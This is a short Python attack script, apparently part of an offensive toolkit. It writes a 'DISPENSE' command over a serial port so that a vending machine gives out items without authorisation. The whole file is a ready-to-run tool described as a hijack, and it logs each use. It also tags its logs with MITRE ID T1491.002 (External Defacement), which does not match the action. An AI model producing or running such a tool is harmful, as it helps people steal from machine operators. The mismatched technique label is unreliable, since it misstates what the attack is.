#!/usr/bin/env python3
# modules/attacks/vending_machine_hijacker.py

import time
import serial
import argparse
import os
import json
from datetime import datetime

LOG_FILE = "results/vending_hijack_log.json"
MITRE_TTP = "T1491.002"

def log_dispense(port, item_code):
    os.makedirs("results", exist_ok=True)
    log = {
        "timestamp": datetime.utcnow().isoformat(),
        "port": port,
        "item_code": item_code,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(log) + "\n")

def send_dispense_command(port, item_code):
    try:
        ser = serial.Serial(port, 9600, timeout=1)
        time.sleep(1)
        cmd = f"DISPENSE:{item_code}\n".encode()
        ser.write(cmd)
        ser.close()
        log_dispense(port, item_code)
        print(f"[✓] Dispense command sent on {port} for item '{item_code}'")
    except Exception as e:
        print(f"[!] Failed to hijack vending machine: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Hijack vending machine to dispense unauthorized items")
    parser.add_argument("--port", required=True, help="Serial port (e.g. /dev/ttyUSB0)")
    parser.add_argument("--item", required=True, help="Item code to dispense")
    args = parser.parse_args()
    send_dispense_command(args.port, args.item)
